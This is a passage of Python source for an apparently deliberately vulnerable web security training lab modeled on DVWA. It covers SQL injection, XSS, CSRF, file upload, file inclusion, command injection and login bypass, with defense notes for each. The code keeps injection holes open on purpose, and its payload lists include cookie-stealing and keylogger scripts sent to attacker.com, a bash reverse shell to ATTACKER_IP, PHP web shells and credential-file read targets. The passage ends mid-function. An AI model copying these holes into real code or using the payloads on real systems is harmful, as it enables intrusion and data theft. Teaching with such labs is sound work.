        ("List tables","Read sqlite_master to find table names","0 UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'-- -"),
        ("Table schema","Get column names of users table","0 UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE name='users'-- -"),
        ("Stacked comments","Bypass simple keyword filters","1/**/OR/**/1=1-- -"),
        ("URL encoded","Evade simple WAF rules","%31%20%4f%52%20%31%3d%31"),
        ("Case variation","Bypass case-sensitive keyword filters","1 oR 1=1-- -"),
        ("Hash comment","MySQL style hash comment","1 OR 1=1#"),
    ]
    ph='<div class="stitle">Payloads (click to fill input)</div>'+"".join(pcard(t,d,p,"sqli-input") for t,d,p in pl)
    return base_page("SQL Injection",f"""
<div class="ph"><h2>SQL Injection</h2><p>Manipulate SQL queries to bypass auth, extract data, and enumerate the entire database.</p></div>
<div class="g2">
<div>
<div class="card"><h3>User Lookup <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>User ID</label><input type="text" name="id" id="sqli-input" value="{html.escape(uid)}" placeholder="1 OR 1=1-- -"><button class="btn btn-d" type="submit">Submit</button></form>{result}</div>
<div class="card"><h3>Payloads</h3><div style="max-height:460px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How SQL Injection Works</h4>
<p>When user input is embedded directly in a SQL query without sanitization, injected SQL syntax alters the query logic.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Detect: inject <code>'</code> — look for database errors</div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Count columns: <code>ORDER BY 1,2,3...</code> until error</div></div>
<div class="step"><div class="snum">3</div><div class="stxt">UNION SELECT to extract data from any table</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">Dump users, hashes, secrets, then crack offline</div></div>
</div>
<div class="ibox"><h4>Tools</h4><ul>
<li><strong style="color:#f0f6fc">sqlmap</strong> — <code>sqlmap -u "http://localhost:8888/sqli?id=1" --dump</code></li>
<li><strong style="color:#f0f6fc">Manual</strong> — Burp Suite Repeater</li>
</ul></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Parameterized queries: <code>cursor.execute("SELECT * FROM users WHERE id=?", (id,))</code></li>
<li>Use an ORM (SQLAlchemy, Django ORM)</li>
<li>Whitelist input types — reject non-integers for ID fields</li>
<li>Least-privilege DB user</li>
</ul></div>
</div></div>""","sqli", session)

# ── BLIND SQLI ────────────────────────────────────────────────────────────────
def page_sqli_blind(params, session=None):
    lv=SECURITY_LEVEL["level"]; uid=params.get("id",[""])[0]; result=""
    if uid:
        conn=sqlite3.connect(DB_PATH); c=conn.cursor()
        try:
            if lv=="low":
                q=f"SELECT id FROM users WHERE id = {uid}"
                c.execute(q); row=c.fetchone()
                result=('<div class="flag">Response: TRUE — User exists</div>' if row else '<div class="err">Response: FALSE — User does not exist</div>')
                result+=f'<div class="hint">Query: <code>{html.escape(q)}</code></div>'
            else:
                try:
                    c.execute("SELECT id FROM users WHERE id = ?",(int(uid),)); row=c.fetchone()
                    result='<div class="flag">Response: TRUE</div>' if row else '<div class="err">Response: FALSE</div>'
                except: result='<div class="err">Response: FALSE</div>'
        except: result='<div class="err">Response: FALSE</div>'
        conn.close()
    pl=[
        ("Boolean TRUE","Confirm injection","1 AND 1=1-- -"),
        ("Boolean FALSE","Confirm injection","1 AND 1=2-- -"),
        ("Extract admin hash char 1","Check first char of admin MD5","1 AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='5'-- -"),
        ("Username length","Check if admin username length > 4","1 AND LENGTH((SELECT username FROM users WHERE id=1))>4-- -"),
        ("Count users","Check if more than 3 users exist","1 AND (SELECT COUNT(*) FROM users)>3-- -"),
        ("Role check","Confirm user ID 1 is admin","1 AND (SELECT role FROM users WHERE id=1)='admin'-- -"),
        ("DB version char","Extract first char of SQLite version","1 AND SUBSTR(sqlite_version(),1,1)='3'-- -"),
        ("Time-based","Heavy computation causes delay","1 AND 1=(SELECT 1 FROM (SELECT RANDOMBLOB(50000000)) WHERE 1=1)-- -"),
    ]
    ph='<div class="stitle">Boolean Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"blind-input") for t,d,p in pl)
    return base_page("Blind SQLi",f"""
<div class="ph"><h2>Blind SQL Injection</h2><p>No data returned — only TRUE/FALSE response. Extract data one character at a time.</p></div>
<div class="g2">
<div>
<div class="card"><h3>User Check <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>User ID</label><input type="text" name="id" id="blind-input" value="{html.escape(uid)}" placeholder="1 AND 1=1-- -"><button class="btn btn-d" type="submit">Check</button></form>{result}</div>
<div class="card"><h3>Payloads</h3><div style="max-height:440px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How Blind SQLi Works</h4>
<p>Use SUBSTR() to check one char at a time against the application's TRUE/FALSE response.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Confirm: <code>1 AND 1=1</code> = TRUE, <code>1 AND 1=2</code> = FALSE</div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Use SUBSTR(): <code>SUBSTR(password,1,1)='5'</code></div></div>
<div class="step"><div class="snum">3</div><div class="stxt">Binary search ASCII 32–126 for each character</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">Automate: <code>sqlmap --technique=B</code></div></div>
</div>
</div></div>""","sqli-blind", session)

def page_xss_reflected(params, session=None):
    lv=SECURITY_LEVEL["level"]; name=params.get("name",[""])[0]; out=""
    if name:
        if lv=="low":   out=f'<div class="out" style="color:#c9d1d9">Hello, {name}!</div>'
        elif lv=="medium":
            s=re.sub(r'<script[^>]*>.*?</script>','',name,flags=re.IGNORECASE|re.DOTALL)
            out=f'<div class="out" style="color:#c9d1d9">Hello, {s}!</div>'
        else: out=f'<div class="out">Hello, {html.escape(name)}!</div>'
    pl=[
        ("Classic script alert","Tests if script tags pass through","<script>alert('XSS by Khalil')</script>"),
        ("img onerror","Fires on broken image","<img src=x onerror=alert(document.domain)>"),
        ("SVG onload","SVG element executes JS on load","<svg onload=alert(1)>"),
        ("Cookie stealer","Exfiltrate session cookie","<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"),
        ("DOM redirect","Redirect victim to phishing page","<script>window.location='http://attacker.com/phish'</script>"),
        ("Uppercase bypass","Bypass lowercase-only filter","<SCRIPT>alert(1)</SCRIPT>"),
        ("Input autofocus","Fires onfocus — no click needed","<input autofocus onfocus=alert(1)>"),
    ]
    ph='<div class="stitle">Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"xss-r-input") for t,d,p in pl)
    return base_page("XSS Reflected",f"""
<div class="ph"><h2>XSS — Reflected</h2><p>Input reflected in server response without sanitization.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Name Greeter <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>Your Name</label><input type="text" name="name" id="xss-r-input" value="{html.escape(name)}" placeholder="&lt;script&gt;alert(1)&lt;/script&gt;"><button class="btn btn-d" type="submit">Greet</button></form>{out}</div>
<div class="card"><h3>Payloads</h3><div style="max-height:500px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How Reflected XSS Works</h4>
<p>The payload is in the HTTP request and immediately reflected in the response. Browser executes it as legitimate JavaScript.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Find input reflected in page source</div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Inject <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> to confirm</div></div>
<div class="step"><div class="snum">3</div><div class="stxt">Craft cookie-stealing payload</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">Deliver crafted URL to victim via phishing</div></div>
</div>
<div class="ibox"><h4>Defense</h4><ul>
<li>HTML-encode all output: <code>html.escape(user_input)</code></li>
<li>Content Security Policy header</li>
<li>HTTPOnly + Secure cookie flags</li>
</ul></div>
</div></div>""","xss-reflected", session)

def page_xss_stored(params, method="GET", body_params=None, session=None):
    lv=SECURITY_LEVEL["level"]; msg=""
    if method=="POST" and body_params:
        author=body_params.get("author",["Anonymous"])[0]; comment=body_params.get("comment",[""])[0]
        if comment:
            conn=sqlite3.connect(DB_PATH); c=conn.cursor()
            if lv=="low": sa,sc2=author,comment
            elif lv=="medium":
                sa=html.escape(author)
                sc2=re.sub(r'<script[^>]*>.*?</script>','',comment,flags=re.IGNORECASE|re.DOTALL)
            else: sa,sc2=html.escape(author),html.escape(comment)
            c.execute("INSERT INTO comments (author,content,timestamp) VALUES (?,?,?)",(sa,sc2,time.strftime("%Y-%m-%d %H:%M:%S")))
            conn.commit(); conn.close(); msg='<div class="flag">Comment posted!</div>'
    conn=sqlite3.connect(DB_PATH); c=conn.cursor()
    c.execute("SELECT author,content,timestamp FROM comments ORDER BY id DESC"); rows=c.fetchall(); conn.close()
    ch="".join(f'<div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:.7rem;margin-bottom:.4rem"><strong style="color:#58a6ff">{(r[0] if lv=="low" else html.escape(r[0]))}</strong> <span style="color:#8b949e;font-size:12px">{r[2]}</span><p style="margin-top:.4rem;font-size:13px">{(r[1] if lv=="low" else html.escape(r[1]))}</p></div>' for r in rows)
    pl=[
        ("Classic persistent alert","Fires for every visitor","<script>alert('Stored XSS by Khalil')</script>"),
        ("Cookie harvester","Sends every visitor cookie to attacker","<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>"),
        ("Page defacement","Replace entire page content","<script>document.body.innerHTML='<h1 style=color:red;font-size:60px>Hacked by Khalil</h1>'</script>"),
        ("img onerror bypass","Bypasses script tag filters","<img src=x onerror=fetch('http://attacker.com/c?x='+document.cookie)>"),
        ("Keylogger","Capture every keystroke silently","<script>document.addEventListener('keypress',function(e){fetch('http://attacker.com/k?k='+e.key)})</script>"),
    ]
    ph='<div class="stitle">Stored Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"xss-s-comment") for t,d,p in pl)
    return base_page("XSS Stored",f"""
<div class="ph"><h2>XSS — Stored</h2><p>Payload saved to database — fires automatically for every user who loads the page.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Guestbook <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="POST"><label>Name</label><input type="text" name="author" value="Attacker"><label>Comment</label><textarea name="comment" id="xss-s-comment" placeholder="&lt;script&gt;alert(1)&lt;/script&gt;"></textarea><button class="btn btn-d" type="submit">Post</button></form>{msg}</div>
<div class="card"><h3>Comments</h3><div style="max-height:260px;overflow-y:auto">{ch or '<p style="color:#8b949e;font-size:13px">No comments yet.</p>'}</div></div>
<div class="card"><h3>Payloads</h3><div style="max-height:400px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How Stored XSS Works</h4>
<p>Unlike reflected XSS, stored XSS fires for every visitor automatically. One injection can compromise thousands of users.</p>
</div>
<div class="ibox"><h4>Defense</h4><ul>
<li>HTML-encode on output: <code>html.escape()</code></li>
<li>CSP header prevents inline script execution</li>
<li>HTTPOnly cookies prevent JS cookie access</li>
<li>Use DOMPurify if rich HTML is required</li>
</ul></div>
</div></div>""","xss-stored", session)

def page_xss_dom(params, session=None):
    return base_page("XSS DOM","""
<div class="ph"><h2>XSS — DOM Based</h2><p>Payload never reaches the server. JavaScript reads attacker-controlled sources and writes to dangerous sinks.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Vulnerable innerHTML Sink</h3>
<input type="text" id="dom-input" placeholder="<img src=x onerror=alert(document.domain)>">
<button class="btn btn-d" onclick="runDOM()">Inject to innerHTML</button>
<div id="dom-out" class="out" style="min-height:30px;margin-top:.5rem"></div>
</div>
<div class="card"><h3>Safe vs Dangerous Sinks</h3>
<input type="text" id="sink-input" placeholder="<img src=x onerror=alert(1)>">
<select id="sink-sel" style="margin-bottom:10px">
<option value="innerHTML">innerHTML — DANGEROUS</option>
<option value="innerText">innerText — SAFE</option>
<option value="textContent">textContent — SAFE</option>
<option value="eval">eval() — DANGEROUS</option>
</select>
<button class="btn btn-d" onclick="runSink()">Inject</button>
<div id="sink-out" class="out" style="min-height:30px"></div>
</div>
</div>
<div>
<div class="ibox"><h4>DOM XSS Sources</h4><ul>
<li><code>location.hash</code></li><li><code>location.search</code></li><li><code>document.referrer</code></li><li><code>window.name</code></li><li><code>postMessage()</code></li>
</ul></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Use <code>textContent</code> / <code>innerText</code> instead of <code>innerHTML</code></li>
<li>Use <code>DOMPurify.sanitize()</code> before inserting HTML</li>
<li>Avoid <code>eval()</code> and <code>document.write()</code></li>
</ul></div>
</div></div>
<script>
function runDOM(){var v=document.getElementById('dom-input').value;document.getElementById('dom-out').innerHTML='Result: '+v;}
function runSink(){var v=document.getElementById('sink-input').value,t=document.getElementById('sink-sel').value,el=document.getElementById('sink-out');
if(t==='innerHTML'){el.innerHTML='<span style="color:#f85149">innerHTML: </span>'+v;}
else if(t==='innerText'){el.innerText='innerText (SAFE): '+v;}
else if(t==='textContent'){el.textContent='textContent (SAFE): '+v;}
else if(t==='eval'){try{eval(v);}catch(e){el.textContent='eval error: '+e;}}
}
</script>""","xss-dom", session)

def page_csrf(params, method="GET", body_params=None, session=None):
    lv = SECURITY_LEVEL["level"]
    msg = ""
    if not hasattr(page_csrf, "state"):
        page_csrf.state = {"password": "letmein"}
    expected_token = "token_" + hashlib.md5(b"dvwa_csrf_secret_khalil").hexdigest()[:16]
    if method == "POST" and body_params:
        pw_new   = body_params.get("password_new",  [""])[0]
        pw_conf  = body_params.get("password_conf", [""])[0]
        user_tok = body_params.get("user_token",    [""])[0]
        if pw_new and pw_conf:
            if pw_new != pw_conf:
                msg = '<div class="err">Passwords did not match.</div>'
            elif lv == "low":
                page_csrf.state["password"] = pw_new
                msg = ('<div class="flag">Password Changed!\nNew password: <strong style="color:#7ee787">' + html.escape(pw_new) + '</strong>\nFLAG{csrf_password_changed}</div>')
            elif lv == "medium":
                page_csrf.state["password"] = pw_new
                msg = ('<div class="flag">Password Changed! (Referer check only — bypassable)\nNew password: <strong style="color:#7ee787">' + html.escape(pw_new) + '</strong></div>')
            else:
                if user_tok == expected_token:
                    page_csrf.state["password"] = pw_new
                    msg = ('<div class="flag">Password Changed! (valid CSRF token)\nNew password: <strong style="color:#7ee787">' + html.escape(pw_new) + '</strong></div>')
                else:
                    msg = '<div class="err">CSRF token is incorrect.</div>'
    cur_pw = page_csrf.state["password"]
    token_field = ""
    if lv == "high":
        token_field = '<input type="hidden" name="user_token" value="' + expected_token + '">'
    return base_page("CSRF", f"""
<div class="ph"><h2>CSRF — Cross-Site Request Forgery</h2><p>Trick an authenticated user's browser into silently changing their password.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Change Password <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<p style="font-size:13px;color:#8b949e;margin-bottom:.6rem">Current password: <code style="color:#7ee787">{html.escape(cur_pw)}</code></p>
<form method="POST" action="/csrf">{token_field}
  <label>New password</label><input type="text" name="password_new" placeholder="Enter new password">
  <label>Confirm new password</label><input type="text" name="password_conf" placeholder="Confirm">
  <input type="hidden" name="Change" value="Change">
  <button class="btn btn-p" type="submit">Change</button>
</form>{msg}</div>
</div>
<div>
<div class="ibox"><h4>How CSRF Works</h4>
<p>Browsers attach session cookies to every request to a domain, even ones triggered from other sites. If the server does not verify request origin, an attacker page can silently forge any action.</p>
</div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Synchronizer token — unique random secret per session in every form</li>
<li>SameSite=Strict cookie attribute</li>
<li>Re-authenticate before sensitive actions</li>
</ul></div>
</div></div>""", "csrf", session)

def page_file_upload(params, method="GET", body_params=None, session=None):
    lv = SECURITY_LEVEL["level"]; msg = ""
    UPLOAD_DIR = "/tmp/dvwa_uploads"
    os.makedirs(UPLOAD_DIR, exist_ok=True)
    if method == "POST" and body_params:
        filename    = body_params.get("filename",    [""])[0].strip()
        filecontent = body_params.get("filecontent", [""])[0]
        if filename and filecontent is not None:
            safe = os.path.basename(filename)
            ext  = os.path.splitext(safe)[1].lower()
            def save_file():
                dest = os.path.join(UPLOAD_DIR, safe)
                with open(dest, "w", errors="replace") as fh: fh.write(filecontent)
                return dest
            if lv == "low":
                dest = save_file()
                is_shell = any(k in filecontent for k in ["<?php","<?=","system(","exec(","shell_exec(","passthru("])
                url = f"/uploads/{safe}"
                msg = (f'<div class="flag" style="white-space:pre-wrap">Uploaded: <code>{html.escape(safe)}</code>\nPath: {html.escape(dest)}\n\n' +
                       (f'Shell ready — <a href="{html.escape(url)}" target="_blank" style="color:#7ee787">Open Shell</a>\nFLAG{{file_upload_low_success}}' if is_shell else f'<a href="{html.escape(url)}" target="_blank">View file</a>') + '</div>')
            elif lv == "medium":
                allowed = {".jpg",".jpeg",".png",".gif"}
                if ext not in allowed:
                    msg = '<div class="err">Only JPG, PNG, GIF images allowed.\nBypass: rename to shell.php.jpg (double extension)</div>'
                else:
                    dest = save_file()
                    is_shell = any(k in filecontent for k in ["<?php","<?=","system(","exec("])
                    url = f"/uploads/{safe}"
                    msg = (f'<div class="flag">Uploaded [MEDIUM BYPASS]: <code>{html.escape(safe)}</code>\n<a href="{html.escape(url)}" target="_blank">Open Shell</a>\nFLAG{{file_upload_medium_bypass}}</div>'
                           if is_shell else f'<div class="flag">Uploaded: <code>{html.escape(safe)}</code></div>')
            else:
                allowed = {".jpg",".jpeg",".png",".gif"}
                if ext not in allowed:
                    msg = '<div class="err">Only JPG, PNG, GIF images allowed.</div>'
                elif not any(filecontent.startswith(mg) for mg in ["GIF89a","GIF87a","\xff\xd8\xff","\x89PNG"]):
                    msg = '<div class="err">Invalid image header.\nBypass: prepend GIF89a before PHP code, save as shell.php.gif</div>'
                else:
                    dest = save_file()
                    is_shell = any(k in filecontent for k in ["<?php","<?="])
                    url = f"/uploads/{safe}"
                    msg = (f'<div class="flag">Uploaded [HIGH BYPASS]: <code>{html.escape(safe)}</code>\n<a href="{html.escape(url)}" target="_blank">Open Shell</a>\nFLAG{{file_upload_high_gif89a}}</div>'
                           if is_shell else f'<div class="flag">Image uploaded: <code>{html.escape(safe)}</code></div>')
    try: ufiles = sorted(os.listdir(UPLOAD_DIR))
    except: ufiles = []
    files_html = ""
    for fn in ufiles[:30]:
        fp = os.path.join(UPLOAD_DIR, fn); ext = os.path.splitext(fn)[1].lower()
        is_shell = ext in {".php",".phtml",".phar",".php3",".php5",".php7",".svg",".html"}
        col = "#f85149" if is_shell else "#8b949e"
        try: sz = os.path.getsize(fp)
        except: sz = 0
        open_link = (f' <a href="/uploads/{html.escape(fn)}" target="_blank" style="font-size:11px;color:#238636;margin-left:.4rem">Open Shell ↗</a>' if is_shell
                     else f' <a href="/uploads/{html.escape(fn)}" target="_blank" style="font-size:11px;color:#8b949e;margin-left:.4rem">View ↗</a>')
        files_html += (f'<div style="display:flex;justify-content:space-between;align-items:center;padding:.35rem .75rem;border-bottom:1px solid #21262d">'
                       f'<div><code style="color:{col};font-size:12px">{html.escape(fn)}</code>{open_link}</div>'
                       f'<span style="color:#8b949e;font-size:12px">{sz} B</span></div>')
    if not files_html: files_html = '<p style="color:#8b949e;font-size:13px;padding:.75rem">No files uploaded yet.</p>'
    return base_page("File Upload", f"""
<div class="ph"><h2>File Upload</h2><p>Upload files to plant a web shell and get remote code execution.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Upload <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="POST" action="/file-upload" id="upload-form">
  <div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:.75rem;margin-bottom:.6rem">
    <label style="color:#f0f6fc;font-size:13px;font-weight:600;display:block;margin-bottom:.4rem">Upload from system:</label>
    <input type="file" id="file-picker" accept="*/*" onchange="readFile(this)" style="width:100%;color:#c9d1d9;font-size:13px;cursor:pointer;background:transparent;border:none">
    <div id="file-info" style="font-size:11px;color:#8b949e;margin-top:.3rem"></div>
  </div>
  <label>Filename (editable — change extension for bypass)</label>
  <input type="text" name="filename" id="upload-fn" placeholder="shell.php" style="font-family:monospace">
  <label>File Content</label>
  <textarea name="filecontent" id="upload-content" rows="8" placeholder="Select file above or paste PHP shell..." style="font-family:monospace;font-size:12px;color:#7ee787;background:#0d1117"></textarea>
  <div style="display:flex;gap:.5rem;margin-top:.3rem">
    <button class="btn btn-d" type="submit" style="flex:1">Upload</button>
    <button class="btn btn-s" type="button" onclick="clearForm()">Clear</button>
  </div>
</form>{msg}</div>
<div class="card"><h3>Uploaded Files</h3>
<div style="border:1px solid #30363d;border-radius:6px;max-height:220px;overflow-y:auto">{files_html}</div>
<button class="btn btn-s" style="font-size:12px;margin-top:.5rem" onclick="location.reload()">Refresh</button>
</div>
</div>
<div>
<div class="ibox"><h4>Quick PHP Shells</h4>
<div class="pbox"><div class="ptitle">One-liner</div><code>&lt;?php system($_GET['cmd']); ?&gt;</code></div>
<div class="pbox"><div class="ptitle">With output wrapping</div><code>&lt;?php echo '&lt;pre&gt;'.shell_exec($_GET['cmd'].' 2>&amp;1').'&lt;/pre&gt;'; ?&gt;</code></div>
<div class="pbox"><div class="ptitle">GIF89a bypass (HIGH)</div><code>GIF89a&lt;?php system($_GET['cmd']); ?&gt;</code></div>
</div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Store uploads outside web root</li>
<li>Rename to random UUID on save</li>
<li>Validate MIME via magic bytes</li>
<li>Disable PHP in upload dir: <code>php_flag engine off</code></li>
</ul></div>
</div></div>
<script>
function readFile(input){{var file=input.files[0];if(!file)return;document.getElementById('upload-fn').value=file.name;document.getElementById('file-info').textContent=file.name+' ('+file.size+' bytes)';var r=new FileReader();r.onload=function(e){{document.getElementById('upload-content').value=e.target.result;}};r.readAsText(file);}}
function clearForm(){{document.getElementById('upload-fn').value='';document.getElementById('upload-content').value='';document.getElementById('file-info').textContent='';document.getElementById('file-picker').value='';}}
</script>""", "file-upload", session)

def page_file_include(params, session=None):
    lv=SECURITY_LEVEL["level"]; page=params.get("page",[""])[0]; out=""
    safe={"info.txt":"Server: Enhanced DVWA v2.1 by Khalil","about.txt":"Security training lab.","help.txt":"Use sidebar to navigate."}
    if page:
        if lv=="low":
            try:
                with open(page,"r") as f: out=f'<div class="out">{html.escape(f.read())}</div>'
            except Exception as e: out=f'<div class="err">Error: {html.escape(str(e))}</div>'
        elif lv=="medium":
            if page.startswith("/") or page.startswith("\\"): out='<div class="err">Absolute paths blocked. Try ../ traversal.</div>'
            else:
                try:
                    with open(page,"r") as f: out=f'<div class="out">{html.escape(f.read())}</div>'
                except: out='<div class="err">File not found</div>'
        else:
            out=f'<div class="out">{html.escape(safe[page])}</div>' if page in safe else '<div class="err">File not in allowlist</div>'
    pl=[
        ("/etc/passwd","Enumerate system users","/etc/passwd"),
        ("/etc/hosts","Read network host config","/etc/hosts"),
        ("/proc/self/environ","Leak env vars — may contain secrets","/proc/self/environ"),
        ("Path traversal","Escape app root with ../","../../../../etc/passwd"),
        ("PHP base64 wrapper","Read PHP source without executing","php://filter/convert.base64-encode/resource=index.php"),
        (".env file","App secrets — DB creds, API keys","../../.env"),
        ("/etc/crontab","Discover scheduled tasks","/etc/crontab"),
    ]
    ph='<div class="stitle">LFI Targets (click to fill)</div>'+"".join(pcard(t,d,p,"lfi-input") for t,d,p in pl)
    return base_page("File Inclusion",f"""
<div class="ph"><h2>File Inclusion — LFI</h2><p>Include arbitrary local files by passing unsanitized paths to file-reading functions.</p></div>
<div class="g2">
<div>
<div class="card"><h3>File Viewer <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>File Path</label><input type="text" name="page" id="lfi-input" value="{html.escape(page)}" placeholder="/etc/passwd"><button class="btn btn-d" type="submit">Include</button></form>{out}</div>
<div class="card"><h3>LFI Targets</h3><div style="max-height:460px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Strict allowlist of permitted filenames</li>
<li>Use <code>realpath()</code> and verify path is within allowed directory</li>
<li>Run app with minimal filesystem permissions</li>
</ul></div>
</div></div>""","file-include", session)

def page_cmd_inject(params, method="GET", body_params=None, session=None):
    import subprocess as _sp
    lv  = SECURITY_LEVEL["level"]
    bp  = body_params or {}
    cmd = bp.get("cmd", params.get("cmd", [""]))[0].strip()
    out = ""
    PRE = 'background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:1rem;color:#c9d1d9;font-size:13px;font-family:monospace;white-space:pre-wrap;word-break:break-all;margin-top:.75rem;min-height:40px'
    if cmd:
        if lv == "low":
            try:
                r = _sp.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                out = f'<pre style="{PRE}">{html.escape((r.stdout + r.stderr) or "(no output)")}</pre>'
            except _sp.TimeoutExpired: out = '<div class="err">Command timed out (10s).</div>'
            except Exception as e:     out = f'<div class="err">Error: {html.escape(str(e))}</div>'
        elif lv == "medium":
            if any(b in cmd for b in ["|", ";"]):
                out = '<div class="err">ERROR: An error occurred.</div>'
            else:
                try:
                    r = _sp.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    out = f'<pre style="{PRE}">{html.escape((r.stdout + r.stderr) or "(no output)")}</pre>'
                except _sp.TimeoutExpired: out = '<div class="err">Command timed out.</div>'
                except Exception as e:     out = f'<div class="err">Error: {html.escape(str(e))}</div>'
        else:
            safe = {"id":["id"],"whoami":["whoami"],"hostname":["hostname"],"uname":["uname","-a"],"pwd":["pwd"]}
            if cmd in safe:
                try:
                    r = _sp.run(safe[cmd], capture_output=True, text=True, timeout=5)
                    out = f'<pre style="{PRE}">{html.escape((r.stdout + r.stderr) or "(no output)")}</pre>'
                except Exception as e: out = f'<div class="err">Error: {html.escape(str(e))}</div>'
            else: out = '<div class="err">ERROR: Command not allowed at HIGH security.</div>'
    pl=[
        ("id","Show current user","id"),("whoami","Print username","whoami"),("hostname","Server hostname","hostname"),
        ("uname -a","Kernel info","uname -a"),("cat /etc/passwd","System users","cat /etc/passwd"),
        ("env","Dump environment variables","env"),("ls -la","List directory","ls -la"),
        ("ps aux","Running processes","ps aux"),("ss -tulnp","Listening ports","ss -tulnp"),
        ("id && whoami","MEDIUM bypass: && not blacklisted","id && whoami"),
        ("echo `id`","MEDIUM bypass: backtick substitution","echo `id`"),
        ("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1","Bash reverse shell","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"),
    ]
    ph='<div class="stitle">Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"cmd-input") for t,d,p in pl)
    lv_note = {
        "medium": '<div class="warn" style="margin-bottom:.75rem"><strong>MEDIUM:</strong> <code>|</code> and <code>;</code> blocked. Bypass: <code>&&</code> <code>||</code> backticks <code>$()</code></div>',
        "high":   '<div class="warn" style="margin-bottom:.75rem"><strong>HIGH:</strong> Only: <code>id</code>, <code>whoami</code>, <code>hostname</code>, <code>uname</code>, <code>pwd</code></div>',
    }.get(lv, "")
    return base_page("Command Injection",f"""
<div class="ph"><h2>Command Injection</h2><p>Execute OS commands directly on the server via unsanitized input.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Execute Command <span class="lbadge" style="font-size:11px">{lv}</span></h3>
{lv_note}
<form method="POST" action="/cmd-inject">
  <label>Enter a command:</label>
  <input type="text" name="cmd" id="cmd-input" value="{html.escape(cmd)}" placeholder="id" autocomplete="off" spellcheck="false" style="font-family:monospace">
  <button class="btn btn-d" type="submit">Execute</button>
</form>{out}</div>
<div class="card"><h3>Payloads</h3><div style="max-height:540px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Never pass user input to a shell</li>
<li>Use Python APIs: <code>os.listdir()</code>, <code>pathlib</code></li>
<li>If shell is required, use args list: <code>subprocess.run(["ls", path])</code></li>
<li>Strict allowlist before use</li>
</ul></div>
</div></div>""","cmd-inject", session)

def page_auth_bypass(params, method="GET", body_params=None, session=None):
    lv=SECURITY_LEVEL["level"]; msg=""
    if method=="POST" and body_params:
        user=body_params.get("username",[""])[0]; pw=body_params.get("password",[""])[0]
        conn=sqlite3.connect(DB_PATH); c=conn.cursor()
        try:
            if lv=="low":
                q=f"SELECT * FROM users WHERE username='{user}' AND password='{pw}'"
                c.execute(q); row=c.fetchone()
                msg=(f'<div class="flag">LOGIN SUCCESS as: {html.escape(str(row[1]))} (role:{html.escape(str(row[4]))})\nSecret: {html.escape(str(row[5]))}</div>' if row else '<div class="err">Invalid credentials</div>')
                msg+=f'<div class="hint">Query: <code>{html.escape(q)}</code></div>'
            elif lv=="medium":
                ph=hashlib.md5(pw.encode()).hexdigest()
                c.execute("SELECT * FROM users WHERE username=? AND password=?",(user,ph)); row=c.fetchone()
                msg=f'<div class="flag">Login OK: {html.escape(row[1])}</div>' if row else '<div class="err">Invalid</div>'
            else:
                ph=hashlib.sha256(pw.encode()).hexdigest()
                c.execute("SELECT id,username FROM users WHERE username=?",(user,)); row=c.fetchone()
                if row:
                    c.execute("SELECT id FROM users WHERE id=? AND password=?",(row[0],ph))
                    msg=f'<div class="flag">Login OK: {html.escape(row[1])}</div>' if c.fetchone() else '<div class="err">Invalid</div>'
                else: msg='<div class="err">Invalid</div>'
        except Exception as e: msg=f'<div class="err">DB Error: {html.escape(str(e))}</div>'
        conn.close()
    pl=[
        ("Classic OR bypass","Always true — logs in as first user","admin' OR '1'='1"),
        ("Comment bypass","Drops password check","admin'-- -"),
        ("Hash sign comment","MySQL style","admin'#"),
        ("Always-true OR","Login as first DB user","' OR '1'='1'-- -"),
        ("Default admin creds","Try defaults first","admin / password"),
    ]
    ph='<div class="stitle">Auth Bypass Payloads (click fills username)</div>'+"".join(pcard(t,d,p,"auth-input") for t,d,p in pl)
    return base_page("Auth Bypass",f"""
<div class="ph"><h2>Authentication Bypass</h2><p>Bypass login forms using SQL injection and logic flaws.</p></div>
